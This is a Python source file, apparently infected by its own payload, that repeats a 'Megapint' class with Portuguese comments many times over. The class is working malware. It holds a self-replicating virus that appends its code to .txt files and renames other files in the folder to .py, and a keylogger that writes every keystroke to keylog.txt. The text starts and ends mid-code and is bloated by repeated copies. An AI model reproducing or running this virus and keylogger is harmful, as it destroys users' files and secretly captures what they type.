        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
